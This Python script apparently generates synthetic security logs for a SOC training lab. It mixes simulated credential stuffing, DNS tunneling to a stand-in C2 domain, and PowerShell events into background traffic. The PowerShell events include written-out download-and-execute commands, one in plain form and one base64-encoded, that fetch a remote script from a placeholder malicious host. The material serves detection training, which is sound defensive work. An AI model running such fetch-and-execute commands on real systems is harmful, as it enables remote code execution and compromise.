"""
Generates three sample security log datasets for the SOC internship lab:
  - auth_logs.json      (authentication events, includes a credential-stuffing attack)
  - dns_logs.json        (DNS query events, includes a DNS-tunneling attack)
  - powershell_logs.json (PowerShell execution events, includes malicious IEX usage)

Each file is newline-delimited JSON (one log event per line), ready for bulk
import into Elasticsearch. Attack events are mixed in among normal background
traffic so the correlation rules have something realistic to detect.
"""

import json
import random
from datetime import datetime, timedelta

random.seed(42)  # reproducible output

START = datetime(2026, 7, 20, 0, 0, 0)


def ts(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S")


# ---------------------------------------------------------------------------
# 1. AUTHENTICATION LOGS  (normal traffic + credential stuffing attack)
# ---------------------------------------------------------------------------
auth_logs = []
users = ["jsmith", "agupta", "mchen", "rpatel", "kwilliams", "admin", "svc_backup"]
normal_ips = ["10.0.0.{}".format(i) for i in range(10, 40)]

# Normal background authentication traffic over 24 hours
cur = START
for _ in range(300):
    cur += timedelta(minutes=random.randint(1, 8))
    auth_logs.append({
        "@timestamp": ts(cur),
        "event_type": "authentication",
        "source_ip": random.choice(normal_ips),
        "username": random.choice(users),
        "hostname": "WORKSTATION-{:03d}".format(random.randint(1, 50)),
        "auth_status": random.choices(["success", "failed"], weights=[95, 5])[0],
    })

# Injected attack: credential stuffing burst
# 35 failed logins from a single external IP against 7 accounts in 5 minutes
attack_start = START + timedelta(hours=14, minutes=0)  # 2:00 PM
attack_ip = "192.168.1.100"
attack_users = ["jsmith", "agupta", "mchen", "rpatel", "kwilliams", "admin", "tuser01"]
t = attack_start
for i in range(35):
    t += timedelta(seconds=random.randint(5, 9))
    auth_logs.append({
        "@timestamp": ts(t),
        "event_type": "authentication",
        "source_ip": attack_ip,
        "username": random.choice(attack_users),
        "hostname": "DC-01",
        "auth_status": "failed",
    })

auth_logs.sort(key=lambda x: x["@timestamp"])

with open("auth_logs.json", "w") as f:
    for entry in auth_logs:
        f.write(json.dumps(entry) + "\n")


# ---------------------------------------------------------------------------
# 2. DNS LOGS  (normal traffic + DNS tunneling attack)
# ---------------------------------------------------------------------------
dns_logs = []
normal_domains = [
    "google.com", "microsoft.com", "cloudflare.com", "github.com",
    "amazonaws.com", "office365.com", "slack.com"
]

cur = START
for _ in range(400):
    cur += timedelta(minutes=random.randint(1, 5))
    domain = random.choice(normal_domains)
    query_name = "www." + domain
    dns_logs.append({
        "@timestamp": ts(cur),
        "event_type": "dns_query",
        "source_ip": random.choice(normal_ips),
        "query_name": query_name,
        "query_name_length": len(query_name),
        "query_type": random.choice(["A", "AAAA", "CNAME"]),
        "response_code": "NOERROR",
    })

# Injected attack: DNS tunneling
# 450 queries in 10 minutes, avg query name length ~95 chars, random-looking subdomains
attack_ip_dns = "192.168.1.105"
t = START + timedelta(hours=15, minutes=0)  # 3:00 PM
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
for i in range(450):
    t += timedelta(seconds=random.uniform(1, 1.5))
    encoded = "".join(random.choice(charset) for _ in range(random.randint(80, 100)))
    query_name = f"{encoded}.exfil-c2.example"
    dns_logs.append({
        "@timestamp": ts(t),
        "event_type": "dns_query",
        "source_ip": attack_ip_dns,
        "query_name": query_name,
        "query_name_length": len(query_name),
        "query_type": "TXT",
        "response_code": "NOERROR",
    })

dns_logs.sort(key=lambda x: x["@timestamp"])

with open("dns_logs.json", "w") as f:
    for entry in dns_logs:
        f.write(json.dumps(entry) + "\n")


# ---------------------------------------------------------------------------
# 3. POWERSHELL LOGS  (normal admin activity + malicious IEX usage)
# ---------------------------------------------------------------------------
ps_logs = []
normal_commands = [
    "Get-Process", "Get-Service", "Set-ExecutionPolicy RemoteSigned",
    "Get-ChildItem C:\\Logs", "Restart-Service Spooler",
    "Get-EventLog -LogName System -Newest 50",
]

cur = START
for _ in range(120):
    cur += timedelta(minutes=random.randint(5, 40))
    ps_logs.append({
        "@timestamp": ts(cur),
        "event_type": "powershell_execution",
        "user": random.choice(["svc_backup", "admin", "SYSTEM", "jsmith"]),
        "computer": "WORKSTATION-{:03d}".format(random.randint(1, 50)),
        "command_executed": random.choice(normal_commands),
        "command_encoded": False,
        "execution_status": "success",
    })

# A couple of borderline legitimate admin uses of IEX (for false-positive testing)
for i in range(2):
    cur += timedelta(hours=1)
    ps_logs.append({
        "@timestamp": ts(cur),
        "event_type": "powershell_execution",
        "user": "admin",
        "computer": "DC-01",
        "command_executed": "IEX (New-Object Net.WebClient).DownloadString('https://internal-tools/patch.ps1')",
        "command_encoded": False,
        "execution_status": "success",
    })

# Injected attack: malicious PowerShell (encoded IEX / DownloadString), after hours
attack_time = START + timedelta(hours=23, minutes=10)  # 11:10 PM - after hours
for i in range(5):
    t = attack_time + timedelta(minutes=i * 2)
    ps_logs.append({
        "@timestamp": ts(t),
        "event_type": "powershell_execution",
        "user": "Admin",
        "computer": "DESKTOP-ABC123",
        "command_executed": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==",
        "command_encoded": True,
        "execution_status": "success",
    })

ps_logs.sort(key=lambda x: x["@timestamp"])

with open("powershell_logs.json", "w") as f:
    for entry in ps_logs:
        f.write(json.dumps(entry) + "\n")

print(f"Generated {len(auth_logs)} auth logs, {len(dns_logs)} dns logs, {len(ps_logs)} powershell logs.")
